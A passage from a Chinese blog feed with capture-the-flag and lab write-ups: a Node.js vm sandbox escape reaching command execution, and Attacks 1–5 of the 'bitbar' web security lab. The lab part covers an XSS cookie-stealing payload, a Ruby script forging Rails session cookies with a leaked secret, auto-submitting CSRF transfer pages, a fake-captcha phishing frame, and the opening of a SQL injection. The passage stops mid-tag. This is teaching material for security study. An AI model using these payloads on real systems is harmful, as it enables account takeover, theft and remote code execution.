    <content type="html"><![CDATA[<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`let a = "welcome!";a;`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p>打印出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome</span><br></pre></td></tr></table></figure><p>如果换成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`process`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "/img/loading.gif" data-src="/posts/55470809/1589114675198.png" alt></p><p>因为 <code>process</code> 是没有定义的</p><p>但是我们可以通过这样来获取到系统的环境变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`this.constructor.constructor('return this.process.env')()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure><p>因为 <code>this</code> 指向了一个外部的对象，<code>this.conatructor</code> 指向的就是 Object 对象的 <code>Constructor</code> ， 而 <code>object constructor</code> 返回的就是 <code>Function constructor</code></p><p>完成 RCE</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('dir').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/55470809/1589114918266.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vm沙箱逃逸&quot;&gt;&lt;a href=&quot;#vm沙箱逃逸&quot; class=&quot;headerlink&quot; title=&quot;vm沙箱逃逸&quot;&gt;&lt;/a&gt;vm沙箱逃逸&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://prontosil.me/categories/CTF/"/>
    
    
      <category term="js" scheme="https://prontosil.me/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>bitbar实验</title>
    <link href="https://prontosil.me/posts/bc703cb4/"/>
    <id>https://prontosil.me/posts/bc703cb4/</id>
    <published>2020-05-03T14:50:23.000Z</published>
    <updated>2020-07-08T11:15:36.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Attack-1-Warm-up-exercise-Cookie-Theft"><a href="#Attack-1-Warm-up-exercise-Cookie-Theft" class="headerlink" title="Attack  1: Warm-up exercise: Cookie Theft"></a>Attack  1: Warm-up exercise: Cookie Theft</h2><p>根据路由</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">'profile'</span> =&gt; <span class="string">'user#view_profile'</span></span><br></pre></td></tr></table></figure><p>定位到函数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_profile</span></span></span><br><span class="line">  @username = params[<span class="symbol">:username</span>]</span><br><span class="line">  @user = User.find_by_username(@username)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> @user</span><br><span class="line">    <span class="keyword">if</span> @username <span class="keyword">and</span> @username != <span class="string">""</span></span><br><span class="line">      @error = <span class="string">"User <span class="subst">#&#123;@username&#125;</span> not found"</span></span><br><span class="line">    <span class="keyword">elsif</span> logged_in?</span><br><span class="line">      @user = @logged_in_user</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  render <span class="symbol">:profile</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到，输入的 <code>username</code> 被直接给打印出来，那么自然就存在XSS漏洞了。</p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image()).src=<span class="string">"http://localhost:3000/steal_cookie?cookie="</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者使用 xmlhttprequest 发送</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();x.open(<span class="string">"GET"</span>, <span class="string">"http://localhost:3000/steal_cookie?cookie="</span>+(<span class="built_in">document</span>.cookie));x.send()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1588517915811.png" alt></p><h2 id="Attack-2-Session-hijacking-with-Cookies"><a href="#Attack-2-Session-hijacking-with-Cookies" class="headerlink" title="Attack 2: Session hijacking with Cookies"></a>Attack 2: Session hijacking with Cookies</h2><p><a href="https://ruby-china.org/topics/34235" target="_blank" rel="noopener">参考这篇文章</a></p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/931ecdae-5601-4395-bc2c-d1e49b2ba8e6.png!large" alt></p><blockquote><p>上图说明了原始的 Session 对象 <strong>Session Data</strong> 是如何最终生成 Cookie 的</p></blockquote><p>原来的加密过程：</p><ol><li>序列化</li><li>填充，aes-cbc加密，结果用base64编码</li><li>hmac-sha1签名</li><li>将加密的数据和签名通过 <code>--</code> 连接</li></ol><p>但是意外地发现，bitbar的cookie并没有aes加密，可以通过</p><ol><li>base64解码</li><li>反序列化</li></ol><p>得到原始信息，那么这么一来，就只需要绕过验签这一个障碍了</p><p>在 <code>config/initializers/secret_token.rb</code> 中</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Be sure to restart your server when you modify this file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your secret key is used for verifying the integrity of signed cookies.</span></span><br><span class="line"><span class="comment"># If you change this key, all old signed cookies will become invalid!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure the secret is at least 30 characters and all random,</span></span><br><span class="line"><span class="comment"># no regular words or you'll be exposed to dictionary attacks.</span></span><br><span class="line"><span class="comment"># You can use `rake secret` to generate a secure secret key.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure your secret_key_base is kept private</span></span><br><span class="line"><span class="comment"># if you're sharing your code publicly.</span></span><br><span class="line">Bitbar::Application.config.secret_token = <span class="string">'0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'</span></span><br></pre></td></tr></table></figure><p>这就是hmac-sha1的加解密密钥</p><p>ok，到此为止我们就能伪造数据了</p><ol><li>attacke用户登陆，获取到当前的cookie</li><li>修改cookie值</li></ol><p>这里需要用到 <code>mechanize</code> 这个包，安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install mechanize</span><br></pre></td></tr></table></figure><p>模拟登陆实现</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agent = Mechanize.new <span class="comment">#实例化对象</span></span><br><span class="line">url = <span class="string">"http://localhost:3000/login"</span></span><br><span class="line"></span><br><span class="line">page = agent.get(url) <span class="comment"># 获得网页</span></span><br><span class="line"></span><br><span class="line">form = page.forms.first <span class="comment"># 第一个表单</span></span><br><span class="line">form[<span class="string">'username'</span>] = form[<span class="string">'password'</span>] = <span class="string">'attacker'</span> <span class="comment"># 填写表单，用户名和密码都是attacker</span></span><br><span class="line">agent.submit form <span class="comment"># 提交表单</span></span><br></pre></td></tr></table></figure><p>这就相当于登陆了，然后我们获得cookie信息</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cookie = agent.cookie_jar.jar[<span class="string">'localhost'</span>][<span class="string">'/'</span>][SESSION].to_s.sub(<span class="string">"<span class="subst">#&#123;SESSION&#125;</span>="</span>, <span class="string">''</span>)</span><br><span class="line">cookie_value, cookie_signature = cookie.split(<span class="string">'--'</span>)</span><br><span class="line">raw_session = Base64.decode64(cookie_value)</span><br><span class="line">session = Marshal.load(raw_session)</span><br></pre></td></tr></table></figure><p>session如下:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"session_id"=&gt;"66ef9a22ca26e27ea4d3018b12c07999", "token"=&gt;"q2VXDRnMskkf-69Gu2PiTg", "logged_in_id"=&gt;4&#125;</span><br></pre></td></tr></table></figure><p>很明显， 我们只需要修改 <code>logged_in_id</code> 为1即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">'logged_in_id'</span>] = <span class="number">1</span></span><br><span class="line">cookie_value = Base64.encode64(Marshal.dump(session)).split.join <span class="comment"># get rid of newlines</span></span><br><span class="line">cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)</span><br><span class="line">cookie_full = <span class="string">"<span class="subst">#&#123;SESSION&#125;</span>=<span class="subst">#&#123;cookie_value&#125;</span>--<span class="subst">#&#123;cookie_signature&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">puts <span class="string">"document.cookie='<span class="subst">#&#123;cookie_full&#125;</span>';"</span></span><br></pre></td></tr></table></figure><p>这时候得到的session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&#39;_bitbar_session&#x3D;BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTY2ZWY5YTIyY2EyNmUyN2VhNGQzMDE4YjEyYzA3OTk5BjsAVEkiCnRva2VuBjsARkkiG3EyVlhEUm5Nc2trZi02OUd1MlBpVGcGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkG--935e2e8f9f3d190f2ffccdf9cafd9e4480319054&#39;;</span><br></pre></td></tr></table></figure><p>然后再发送数据，比如访问 <code>http://localhost:3000/profile</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url = URI(<span class="string">'http://localhost:3000/profile'</span>)</span><br><span class="line"></span><br><span class="line">http = Net::HTTP.new(url.host, url.port)</span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">'Cookie'</span><span class="symbol">:cookie_full</span>&#125;</span><br><span class="line">response = http.get(url,header)</span><br><span class="line">puts response.body</span><br></pre></td></tr></table></figure><p>此时我们就能看到，</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1588571397765.png" alt></p><p>浏览器已经认为我们是 <code>user1</code> 了</p><p>完整代码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'mechanize'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></span><br><span class="line">SESSION = <span class="string">'_bitbar_session'</span></span><br><span class="line">RAILS_SECRET = <span class="string">'0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'</span></span><br><span class="line"></span><br><span class="line">agent = Mechanize.new</span><br><span class="line">url = <span class="string">"http://localhost:3000/login"</span></span><br><span class="line"></span><br><span class="line">page = agent.get(url)</span><br><span class="line"></span><br><span class="line">form = page.forms.first</span><br><span class="line">form[<span class="string">'username'</span>] = form[<span class="string">'password'</span>] = <span class="string">'attacker'</span></span><br><span class="line">agent.submit form</span><br><span class="line"></span><br><span class="line">cookie = agent.cookie_jar.jar[<span class="string">'localhost'</span>][<span class="string">'/'</span>][SESSION].to_s.sub(<span class="string">"<span class="subst">#&#123;SESSION&#125;</span>="</span>, <span class="string">''</span>)</span><br><span class="line">cookie_value, cookie_signature = cookie.split(<span class="string">'--'</span>)</span><br><span class="line">raw_session = Base64.decode64(cookie_value)</span><br><span class="line">session = Marshal.load(raw_session)</span><br><span class="line"></span><br><span class="line">puts session</span><br><span class="line">session[<span class="string">'logged_in_id'</span>] = <span class="number">1</span></span><br><span class="line">cookie_value = Base64.encode64(Marshal.dump(session)).split.join <span class="comment"># get rid of newlines</span></span><br><span class="line">cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)</span><br><span class="line">cookie_full = <span class="string">"<span class="subst">#&#123;SESSION&#125;</span>=<span class="subst">#&#123;cookie_value&#125;</span>--<span class="subst">#&#123;cookie_signature&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">url = URI(<span class="string">'http://localhost:3000/profile'</span>)</span><br><span class="line"></span><br><span class="line">http = Net::HTTP.new(url.host, url.port)</span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">'Cookie'</span><span class="symbol">:cookie_full</span>&#125;</span><br><span class="line">response = http.get(url,header)</span><br><span class="line">puts response.body</span><br></pre></td></tr></table></figure><h2 id="Attack-3-Cross-site-Request-Forgery"><a href="#Attack-3-Cross-site-Request-Forgery" class="headerlink" title="Attack 3: Cross-site Request Forgery"></a>Attack 3: Cross-site Request Forgery</h2><p>分析，登陆 user1,向attacker转帐，抓到的数据包如下</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1588573100136.png" alt></p><p>可见，只需要构造一个表单自动提交即可</p><p><code>b.html</code> 内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost:3000/post_transfer"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span> <span class="attr">id</span>=<span class="string">"pay"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"destination_username"</span> <span class="attr">value</span>=<span class="string">"attacker"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"quantity"</span> <span class="attr">value</span>=<span class="string">10</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"pay"</span>).submit();</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.load = validate();</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location = <span class="string">"http://baidu.com"</span>;&#125;, <span class="number">0.1</span>);</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>表单的字段都是隐藏的，并且值都是给定的，之后通过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"pay"</span>).submit();</span><br></pre></td></tr></table></figure><p>实现自动提交</p><p>最后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location = <span class="string">"http://baidu.com"</span>;&#125;, <span class="number">0.1</span>);</span><br></pre></td></tr></table></figure><p>0.1s 后跳转到百度首页</p><p>也可以使用 <code>xmlhttprequest</code> ，一样的思路</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">      request.open(<span class="string">"POST"</span>, <span class="string">"http://localhost:3000/post_transfer"</span>);</span></span><br><span class="line"><span class="actionscript">      request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span></span><br><span class="line"><span class="actionscript">      request.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="actionscript">        request.send(<span class="string">"quantity=10&amp;destination_username=attacker"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (err) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//</span></span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">finally</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">"http://baidu.com/"</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Attack-4-Cross-site-request-forgery-with-user-assistance"><a href="#Attack-4-Cross-site-request-forgery-with-user-assistance" class="headerlink" title="Attack 4: Cross-site request forgery with user assistance"></a>Attack 4: Cross-site request forgery with user assistance</h2><p>由于 <code>http://localhost:3000/super_secure_transfer</code> 转账的时候，表单带上了一个随机token，所以没办法通过 <code>CSRF</code> 来转帐，只能通过钓鱼的办法，欺骗用户输入自己的 <code>Super Secret Token</code>,这样我们就能绕过服务器的校验了</p><p><code>bp2.html</code> 可以使用上一个的代码</p><p><code>bp.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>23333<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">      iframe &#123;</span><br><span class="line">      width: 100%;</span><br><span class="line">      height: 100%;</span><br><span class="line">      border: none;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"bp2.html"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>bp2.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>请输入 super_secure_post_transfer 页面下的 Super Secret Token 来证明你不是机器人<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"token"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Captcha"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">"gotEm()"</span>&gt;</span>Confirm<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gotEm</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">  request.open(<span class="string">"POST"</span>, <span class="string">"http://localhost:3000/super_secure_post_transfer"</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="actionscript">  request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span></span><br><span class="line"><span class="actionscript">  request.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="actionscript">    request.send(<span class="string">"quantity=10&amp;destination_username=attacker&amp;tokeninput="</span> + token);</span></span><br><span class="line"><span class="actionscript">  &#125; <span class="keyword">catch</span> (err) &#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// Do nothing on inevitable XSS error</span></span></span><br><span class="line"><span class="actionscript">  &#125; <span class="keyword">finally</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.top.location = <span class="string">"http://baidu.com"</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Attack-5-Little-Bobby-Tables-aka-SQL-Injection"><a href="#Attack-5-Little-Bobby-Tables-aka-SQL-Injection" class="headerlink" title="Attack 5: Little Bobby Tables (aka SQL Injection)"></a>Attack 5: Little Bobby Tables (aka SQL Injection)</h2><p>删除用户的逻辑如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_delete_user</span></span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> logged_in?</span><br><span class="line">    render <span class="string">"main/must_login"</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  @username = @logged_in_user.username</span><br><span class="line">  User.destroy_all(<span class="string">"username = '<span class="subst">#&#123;@username&#125;</span>'"</span>)</span><br><span class="line"></span><br><span class="line">  reset_session</span><br><span class="line">  @logged_in_user = <span class="literal">nil</span></span><br><span class="line">  render <span class="string">"user/delete_user_success"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到输入的用户名没有经过任何的过滤直接拼接到了SQL语句中，我们看到后台执行的SQL语句</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589676140899.png" alt></p><p>如果我们的用户名中含有user3即可将user3删除</p><p>那么如果我们注册用户</p><figure 